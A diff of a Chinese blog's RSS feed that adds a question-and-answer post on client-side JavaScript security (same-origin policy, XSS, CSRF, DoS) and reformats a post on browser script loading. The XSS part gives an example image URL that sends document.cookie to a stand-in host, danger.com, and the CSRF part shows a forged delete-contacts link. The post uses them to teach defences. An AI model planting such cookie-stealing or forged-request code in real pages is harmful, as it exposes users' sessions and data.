@@ -5,13 +5,112 @@
         <description>张华宁的笔记本 - 张华宁</description>
         <link>http://izhanghuaning.github.io</link>
         <link>http://izhanghuaning.github.io</link>
-        <lastBuildDate>2014-04-03T17:16:34+08:00</lastBuildDate>
-        <pubDate>2014-04-03T17:16:34+08:00</pubDate>
+        <lastBuildDate>2014-04-04T15:09:11+08:00</lastBuildDate>
+        <pubDate>2014-04-04T15:09:11+08:00</pubDate>
         <ttl>1800</ttl>
 
 
         <item>
-                <title>BW客户端js之线程篇(十五)</title>
+                <title>BW客户端js之安全概述篇(三)</title>
+                <description>&lt;h4 id=&quot;whitejs&quot;&gt;White:为什么要重视客户端js的安全性？&lt;/h4&gt;
+
+&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; web浏览器包含js解释器，也就是说一旦载入web页面，就可以让页面上的任意js代码在计算机中执行。&lt;/p&gt;
+
+&lt;p&gt;页面中的js代码来自网络，其中有可能包含恶意代码，盗取用户信息、隐私或者破坏用户系统，所以很明显这里存在安全隐患。浏览器厂商强调自己产品的安全性保障，它们在下面两方面博弈：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;定义强大的客户端API，启用强大的web应用。&lt;/li&gt;
+
+&lt;li&gt;阻止恶意代码读取或修改数据、盗取隐私、诈骗或浪费时间。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;浏览器厂商一方面禁止客户端js的一些功能，比如js不能随意读取、写入或删除任意本地文件或目录；客户端js没有任何网络通讯能力；客户端js不能构建服务器，即网络中的浏览器之间无法直接进行通信。&lt;/p&gt;
+
+&lt;p&gt;另一方面浏览器厂商对于支持的一些功能施加限制，来加强安全性。&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h4 id=&quot;whitejs_2&quot;&gt;White:客户端js有哪些限制？&lt;/h4&gt;
+
+&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;js程序可以打开一个新窗口，但浏览器限制它只能影响用户单击鼠标等操作触发事件的时候才能使用它。&lt;/li&gt;
+
+&lt;li&gt;js可以关闭自己打开的窗口，但不允许它不经用户确认就关闭其他的窗口。&lt;/li&gt;
+
+&lt;li&gt;html的fileupload控件的value属性是只读的，意味着它只能是用户主动选择的文件。&lt;/li&gt;
+
+&lt;li&gt;js不能读取从不同服务器载入的文档的内容，遵循同源策略。js文件的内容可以跨域访问，利用它构建jsonp技术。&lt;/li&gt;
+
+&lt;li&gt;js脚本不能在来自不同服务器的文档上注册事件监听器。防止脚本窃取其他页面用户输入。&lt;/li&gt;
+
+&lt;li&gt;XMLHttpRequest只能访问同源的服务器。&lt;/li&gt;
+
+&lt;li&gt;js可以打开其他服务器的页面，但不能读取页面上的js脚本和html内容。&lt;/li&gt;
+
+&lt;li&gt;cookie的访问遵循同源策略。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;后面几条都是基于同源策略作出的安全限制。&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h4 id=&quot;white&quot;&gt;White:什么是同源策略？&lt;/h4&gt;
+
+&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 同源的意思是url中的协议(http,https)、域名、端口必须相同，并且域名不能是com、net这样的顶级域名。如果包含子域名，则子域名也必须相同。&lt;/p&gt;
+
+&lt;p&gt;同源策略是对js代码能够操作哪些web内容的一条完整的安全限制。当web页面使用iframe元素或者打开其他窗口的时候，这一策略通常会发挥作用。此时同源策略负责管理窗口或窗体中js代码和其他窗口间的交互。具体来说，脚本只能读取和所述文档来源相同的窗口和文档的属性。&lt;/p&gt;
+
+&lt;p&gt;脚本本身的来源和同源策略不相关，相关的是脚本所在的文档。&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h4 id=&quot;white_2&quot;&gt;White:安全的突破同源策略的技术？&lt;/h4&gt;
+
+&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 因为同源策略的限制太严格，给现实需求带来一些问题。比如一个大站点包含多个子域，有些信息需要在多个子域间共享。为了支持这种需求，有了如下几种不严格的同源策略解决方式：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;可以设置不同子域文档的document的domain属性到其上一级域名。设置的域名只能提升到上级域名，而不能降低或者跳到同级其他域名。&lt;/li&gt;
+
+&lt;li&gt;动态script实现，即jsonp技术,可以完全跨域名但是接受请求的一般会严格限制其来源来保证安全性。&lt;/li&gt;
+
+&lt;li&gt;利用ifrmae和hash实现，hash可以跨窗口，可以完全跨域名。&lt;/li&gt;
+
+&lt;li&gt;利用window.name实现，window.name可以跨窗口，可以完全跨域名。&lt;/li&gt;
+
+&lt;li&gt;HTML5提出了跨文档消息(cross-document messaging)，允许来自一个文档的脚本可以传递文本消息到另一个文档的脚本，不考虑其来源。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h4 id=&quot;whitexss&quot;&gt;White:什么是跨站脚本攻击(XSS)？&lt;/h4&gt;
+
+&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 跨站脚本(Cross-site script)是攻击者像目标web页面注入html标签和脚本，使得访问这个页面的浏览者受到攻击。&lt;/p&gt;
+
+&lt;p&gt;举例说明：页面xss.html中的一部分内容是动态读取其他用户录入的信息，但是某个恶意用户在其中输入了&lt;code&gt;alert(&amp;#39;你被攻击了&amp;#39;)&lt;/code&gt;，然后”页面没有进行安全处理把恶意输入记录了”，当其他浏览者访问xss.html页面时，”页面也没有进行安全处理就显示了这些内容”，那么用户就被攻击了。&lt;/p&gt;
+
+&lt;p&gt;其实上述两个安全处理都很复杂，涉及到编码等情况让其复杂无比。方案有编码输入输出、设置白名单(黑名单不推荐)、设置安全边界等等。&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h4 id=&quot;whitexss_2&quot;&gt;White:电子邮件来说明跨站脚本攻击(XSS)？&lt;/h4&gt;
+
+&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 我们知道一般电子邮箱都会默认屏蔽图片的显示，我就来说一下为什么要这么做。电子邮箱的内容是支持html的，那么其内容也就可能是带有js代码和html元素。比如一张图片其&lt;code&gt;src = &amp;#39; h t t p://danger.com/getcookie/xss.jpg?msg = document.cookie&amp;#39;&lt;/code&gt;。这里我随便写的只是为了举例说明原理，没有测试过。&lt;/p&gt;
+
+&lt;p&gt;当你显示这张图片的时候，浏览器会访问src指向的地址来获取图片，这时候你肯定是登录了邮箱，所以后面的’document.cookie’会把你电子邮箱的身份信息发送到danger.com，它通过一段代码把你的信息记录下来，这些信息可能包含你的银行卡号、电话号码、密码等等（这要看你使用的电子邮件服务商的安全性）。这样恶意用户就得到了你的很多信息了，可以用来做很多危害你的事情。比如CSRF。&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h4 id=&quot;whitecsrf&quot;&gt;White:什么是跨站请求伪造攻击(CSRF)？&lt;/h4&gt;
+
+&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 跨站请求伪造（Cross-site request forgery）是攻击者盗用了你的身份，以你的名义发送恶意请求，执行了你不知道的操作。&lt;/p&gt;
+
+&lt;p&gt;上面恶意用户知道了你的很多信息，又给你一封恶意邮件，上面包含一个删除你通讯录所有电邮地址的链接，这个链接被伪装为”点击我得500W”、”点击看美女”等非常诱惑的信息，其实它的链接是这样&lt;code&gt;href=&amp;#39;h t t p://yourmail.com/api/operate=deleteallcontacter&amp;#39;&lt;/code&gt;这样的，你点击之后你的联系人统统不见了。&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h4 id=&quot;whitedos&quot;&gt;White:什么是拒绝服务攻击(DOS)？&lt;/h4&gt;
+
+&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 这个以前经常见，你打开一个网页，不停弹出提示让你确定，却永远确定不完，也不能关闭窗口，就属于这样的攻击。就是让你不能使用。不过现在这样的几乎不见了，浏览器帮你处理掉这样的恶意代码了。&lt;/p&gt;
+
+&lt;p&gt;但是有些比较隐晦使用window.setInterval()这样的方法来占用你的cpu，也能达到拒绝服务攻击的效果。&lt;/p&gt;
+
+&lt;p&gt;DOS通常来指的是攻击服务器，只要攻击来源足够多，没有一劳永逸的办法防御，只能通过延长请求间隔、封锁ip、防机器人验证等方式来减缓攻击造成的危害。&lt;/p&gt;
+&lt;hr /&gt;</description>
+                <link>http://izhanghuaning.github.io/books/2011/07/15/jsdg-chap13-js-tsecurity.html</link>
+                <guid>http://izhanghuaning.github.io/books/2011/07/15/jsdg-chap13-js-tsecurity</guid>
+                <pubDate>2011-07-15T00:00:00+08:00</pubDate>
+        </item>
+
+        <item>
+                <title>BW客户端js之线程篇(二)</title>
                 <description>&lt;h4 id=&quot;whitejs&quot;&gt;White:浏览器中的js线程模型？&lt;/h4&gt;
 
 &lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; js语言核心并不包含任何线程机制，并且客户端js在HTML5之前也没有定义任何线程机制。HTML5定义了一种后台线程的”Web Worker”，但客户端js还是严格按照单线程工作。&lt;/p&gt;
@@ -25,21 +124,37 @@
 &lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
 
 &lt;ol&gt;
-&lt;li&gt;web浏览器创建document对象，并开始解析web页面，解析html元素和它们的文本内容后添加Element对象和Text节点到文档中。在这个阶段document.readstate的属性值是”loading”。&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;web浏览器创建document对象，并开始解析web页面，解析html元素和它们的文本内容后添加Element对象和Text节点到文档中。在这个阶段document.readstate的属性值是”loading”。&lt;/p&gt;
+&lt;/li&gt;
 
-&lt;li&gt;当html解析器遇到没有async和defer属性的script标签时，它把这些元素添加到文档中，然后执行内联js脚本或者外联js文件代码。这些脚本会同步执行，并在脚本下载和执行时解析器会暂停。这样脚本就可以使用document.write()把文本插入到输出流中。解析器恢复时这些文本会成为文档的一部分。同步脚本经常简单的定义函数和注册后面使用的事件处理程序，但它们可以遍历和操作文档树，因为在它们执行时已经存在了。同步脚本还能够且只能够看到它执行前渲染好的文档内容，包括自己script元素本身。&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;当html解析器遇到没有async和defer属性的script标签时，它把这些元素添加到文档中，然后执行内联js脚本或者外联js文件代码。这些脚本会同步执行，并在脚本下载和执行时解析器会暂停。这样脚本就可以使用document.write()把文本插入到输出流中。解析器恢复时这些文本会成为文档的一部分。同步脚本经常简单的定义函数和注册后面使用的事件处理程序，但它们可以遍历和操作文档树，因为在它们执行时已经存在了。同步脚本还能够且只能够看到它执行前渲染好的文档内容，包括自己script元素本身。&lt;/p&gt;
+&lt;/li&gt;
 
-&lt;li&gt;当解析器遇到有async属性的script标签时，它们开始下载脚本，并且同时进行后面的文档解析。脚本会在它下载完成后尽快执行，但解析器不会停下来等它下载。异步脚本禁止使用document.write()方法。它也只能看到其script标签之前的内容。（因为是异步，其不能依赖其他异步生成的文档内容）&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;当解析器遇到有async属性的script标签时，它们开始下载脚本，并且同时进行后面的文档解析。脚本会在它下载完成后尽快执行，但解析器不会停下来等它下载。异步脚本禁止使用document.write()方法。它也只能看到其script标签之前的内容。（因为是异步，其不能依赖其他异步生成的文档内容）&lt;/p&gt;
+&lt;/li&gt;
 
-&lt;li&gt;当文档解析完成，document.readstate属性变成”interactive”。&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;当文档解析完成，document.readstate属性变成”interactive”。&lt;/p&gt;
+&lt;/li&gt;
 
-&lt;li&gt;所有有defer属性的脚本，会按照它们在文档里出现顺序执行。defer延迟脚本其能访问整个文档树。延迟脚本禁止使用document.write()方法，因为浏览器解析已经完成了。&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;所有有defer属性的脚本，会按照它们在文档里出现顺序执行。defer延迟脚本其能访问整个文档树。延迟脚本禁止使用document.write()方法，因为浏览器解析已经完成了。&lt;/p&gt;
+&lt;/li&gt;
 
-&lt;li&gt;浏览器在document对象上触发DOMContentLoaded事件。这标志程序执行从同步脚本执行阶段转换到异步事件驱动阶段。但要注意，这时可能还有异步脚本没有执行完成。css文件、图片、js脚本等也可能还在下载。&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;浏览器在document对象上触发DOMContentLoaded事件。这标志程序执行从同步脚本执行阶段转换到异步事件驱动阶段。但要注意，这时可能还有异步脚本没有执行完成。css文件、图片、js脚本等也可能还在下载。&lt;/p&gt;
+&lt;/li&gt;
 
-&lt;li&gt;当图片等所有内容完成载入，并且所有的异步脚本完成载入和执行，document.readstate属性变为”complete”，web浏览器触发window对象的load事件。&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;当图片等所有内容完成载入，并且所有的异步脚本完成载入和执行，document.readstate属性变为”complete”，web浏览器触发window对象的load事件。&lt;/p&gt;
+&lt;/li&gt;
 
-&lt;li&gt;从此刻起，回调用异步事件，以响应用户输入事件、网络事件、计时器过期等。&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;从此刻起，回调用异步事件，以响应用户输入事件、网络事件、计时器过期等。&lt;/p&gt;
+&lt;/li&gt;
 &lt;/ol&gt;
 &lt;hr /&gt;
 &lt;h4 id=&quot;whitehtmljs&quot;&gt;White:html中js时间线在首屏加载的意义？&lt;/h4&gt;
@@ -49,22 +164,6 @@
 &lt;p&gt;一般来说首屏用到的文档内容（html）、交互（js）、视觉效果（css）需要尽快加载完成。其他内容可以通过动态加载方式继续加载和渲染。&lt;/p&gt;
 
 &lt;p&gt;这就需要控制script代码、js文件、css文件、大图片等在html中的位置。首屏尽量不通过js代码进行布局和css渲染显示效果，如果需要则这些js代码和css尽量靠前(head中)，防止出现闪烁现象。同步执行的js代码应尽量少，并且需要放置在合适的位置(首屏内容)。用来响应首屏用户交互的代码尽量靠后（首屏内容后面）。其他html内容、js文件、css文件、图片等使用动态加载方式，延迟加载。&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h4 id=&quot;whitehtmlscriptasyncdefer&quot;&gt;White:html中script标签的async和defer属性的区别？&lt;/h4&gt;
-
-&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h4 id=&quot;whitehtmlscriptasyncdefer_2&quot;&gt;White:html中script标签的async和defer属性的区别？&lt;/h4&gt;
-
-&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h4 id=&quot;whitehtmlscriptasyncdefer_3&quot;&gt;White:html中script标签的async和defer属性的区别？&lt;/h4&gt;
-
-&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h4 id=&quot;whitehtmlscriptasyncdefer_4&quot;&gt;White:html中script标签的async和defer属性的区别？&lt;/h4&gt;
-
-&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;
 &lt;hr /&gt;</description>
                 <link>http://izhanghuaning.github.io/books/2011/07/10/jsdg-chap13-jsthread.html</link>
                 <guid>http://izhanghuaning.github.io/books/2011/07/10/jsdg-chap13-jsthread</guid>
@@ -72,7 +171,7 @@
         </item>
 
         <item>
-                <title>BW客户端js概述篇(十四)</title>
+                <title>BW客户端js概述篇(一)</title>
                 <description>&lt;h4 id=&quot;whitejs&quot;&gt;White:什么是客户端js？&lt;/h4&gt;
 
 &lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; js分为原生js、客户端js、服务端js。原生js就是ECMAScript，是js标准，在客户端和服务端是一样的。客户端js就是在浏览器中使用的js，定义了window等一系列对象和方法，基于安全原因限制很多，不能操作文件、网络等。服务端js是可以类似java等构建整个应用的，可以操作网络、数据库、文件等。&lt;/p&gt;
